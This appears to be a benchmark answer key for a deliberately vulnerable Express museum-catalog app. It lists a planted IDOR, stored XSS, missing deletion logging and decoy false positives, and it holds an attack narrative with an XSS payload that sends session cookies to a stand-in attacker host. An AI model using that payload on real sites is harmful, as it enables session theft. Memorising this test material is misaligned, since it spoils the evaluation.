# Security Report: app-38-museum-catalog

## Application Information

- **App ID**: app-38
- **App Name**: Museum Collection Catalog
- **Language**: JavaScript
- **Framework**: Express
- **Source**: `apps/javascript/app-38-museum-catalog/`

---

## Vulnerability Summary

| ID | OWASP | Category | Severity | Location | CWE |
|---|---|---|---|---|---|
| V1 | A01 | Broken Access Control | Medium | `src/index.js` → `GET /api/exhibits/:id` (lines 136-152) | CWE-639 |
| V2 | A03 | Injection | High | `src/index.js` → `GET /api/guestbook` (lines 155-165) | CWE-79 |
| V3 | A09 | Security Logging and Monitoring Failures | Low | `src/index.js` → `POST /api/exhibits/:id/delete` (lines 184-200) | CWE-778 |

### V1: IDOR on Exhibit Details

**OWASP Category**: A01 — Broken Access Control

**Description**: The exhibit detail retrieval endpoint fails to verify if the requesting user owns the exhibit or possesses curator/admin permissions, allowing authenticated users to access confidential notes.

**Endpoint**: `GET /api/exhibits/:id`

**CWE**: CWE-639 (Authorization Bypass Through User-Controlled Key)

**Impact**: Medium — Any authenticated user can view private/exclusive catalog notes attached to any museum exhibit by simply iterating exhibit IDs.

**Detection**: Look for absence of ownership checks or role-based authorization in the exhibit detail handler before returning sensitive `notes` or `internalComments` fields.

---

### V2: Stored XSS in Guestbook

**OWASP Category**: A03 — Injection

**Description**: Visitor guestbook comments are rendered to the client without HTML entity encoding, leaving visitors vulnerable to Stored XSS.

**Endpoint**: `GET /api/guestbook`

**CWE**: CWE-79 (Improper Neutralization of Input During Web Page Generation)

**Impact**: High — An attacker can post a malicious JavaScript payload in a guestbook comment. When a curator or other visitor views the guestbook page, the script executes in their browser, potentially stealing session cookies or performing actions on their behalf.

**Detection**: Look for guestbook comment rendering logic that inserts user content directly into HTML without escaping or sanitization (e.g., `res.send()` with raw HTML strings or `innerHTML` assignment on the frontend).

---

### V3: Missing Audit Log on Exhibit Deletion

**OWASP Category**: A09 — Security Logging and Monitoring Failures

**Description**: Deleting sensitive museum artifacts from the catalog produces no audit log tracking outputs, blinding administrators to record destruction.

**Endpoint**: `POST /api/exhibits/:id/delete`

**CWE**: CWE-778 (Insufficient Logging)

**Impact**: Low — Malicious or accidental deletion of exhibit records cannot be traced or investigated.

**Detection**: Check the delete handler for any logging, audit trail, or notification mechanism before/after performing the deletion operation.

---

## Chained Attack Scenario

### Chain: "Stored Guestbook XSS → Session Hijack IDOR Exfiltration"

**Impact**: `db_exfiltration`

**Overview**: An attacker posts an XSS payload to the guestbook. When a curator admin views it, their session is stolen and used to exfiltrate private catalog notes via IDOR.

**Components**:

| Step | Issue | Severity | OWASP | CWE | Location |
|---|---|---|---|---|---|
| 1 | Stored guestbook XSS script allows cookie theft | Medium | A03 | CWE-79 | `GET /api/guestbook` |
| 2 | Details endpoint permits IDOR exfiltration of sensitive records | Medium | A01 | CWE-639 | `GET /api/exhibits/:id` |

**Attack Narrative**:
1. The attacker posts an XSS cookie-stealer payload to `POST /api/guestbook` (e.g., `<script>document.location='https://attacker.com/steal?cookie='+document.cookie</script>`).
2. When the curator admin reviews the guestbook by calling `GET /api/guestbook`, the stored XSS payload executes in the admin's browser, leaking their session cookie to the attacker.
3. Using the hijacked admin cookie, the attacker queries `GET /api/exhibits/2` to bypass access controls and exfiltrate private, high-value catalog notes from exhibits they should not have access to.

**Combined Impact**: Database exfiltration — An attacker can steal admin session credentials and use them to extract sensitive museum catalog data via IDOR.

---

## Decoys (False-Positive Candidates)

| Location | Description |
|---|---|
| `src/index.js` | Proper escaping of HTML tags on exhibit titles during list lookups in `GET /api/exhibits` |
| `src/index.js` | Proper Bcrypt hashing for password storage and validation |

---

## Detection Commands

```bash
# Find IDOR vulnerability on exhibit details
grep -n "exhibits.*:id\|findOne\|findById" apps/javascript/app-38-museum-catalog/src/index.js

# Find XSS in guestbook rendering
grep -n "guestbook\|innerHTML\|res\.send\|escape\|sanitize" apps/javascript/app-38-museum-catalog/src/index.js

# Find missing audit logs on deletion
grep -n "delete\|remove\|log\|audit" apps/javascript/app-38-museum-catalog/src/index.js
```

---

*Report generated from `.vulns` manifest for app-38-museum-catalog*